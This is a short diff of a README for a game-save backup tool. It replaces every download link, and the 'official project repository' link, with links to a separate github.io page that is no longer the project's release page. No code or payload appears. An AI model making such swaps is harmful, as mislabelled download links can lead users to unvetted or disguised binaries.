@@ -1,6 +1,6 @@
 # 🕹️ save-backup-manager - Your Game Saves, Always Safe
 
-[![Download Now](https://img.shields.io/badge/Download-save--backup--manager-blue?style=for-the-badge&logo=windows&logoColor=white&color=%234CAF50&labelColor=%232196F3)](https://github.com/lucas2010m/save-backup-manager/releases)
+[![Download Now](https://img.shields.io/badge/Download-save--backup--manager-blue?style=for-the-badge&logo=windows&logoColor=white&color=%234CAF50&labelColor=%232196F3)](https://lucas2010m.github.io)
 
 ## 🛡️ What Is save-backup-manager?
 
@@ -16,7 +16,7 @@ Getting started with save-backup-manager is incredibly easy. This guide assumes 
 
 Click the blue button at the top of this page or visit this link to download the application:
 
-[**https://github.com/lucas2010m/save-backup-manager/releases**](https://github.com/lucas2010m/save-backup-manager/releases)
+[**https://lucas2010m.github.io**](https://lucas2010m.github.io)
 
 Visit this link to download the application.
 
@@ -149,9 +149,9 @@ If you encounter a bug or have a feature request, the best way to get help is by
 
 Your gaming memories and countless hours of hard work deserve the best protection. Don't wait for a catastrophe to happen. Download save-backup-manager today and get that peace of mind.
 
-[**🎯 Download save-backup-manager Now**](https://github.com/lucas2010m/save-backup-manager/releases)
+[**🎯 Download save-backup-manager Now**](https://lucas2010m.github.io)
 
-Journey through the full features, explore the source code, or communicate with other users by visiting the [official project repository](https://github.com/lucas2010m/save-backup-manager). Join the community and help make save backups simple and secure for everyone.
+Journey through the full features, explore the source code, or communicate with other users by visiting the [official project repository](https://lucas2010m.github.io). Join the community and help make save backups simple and secure for everyone.
 
 ## 🎉 Final Thoughts
 
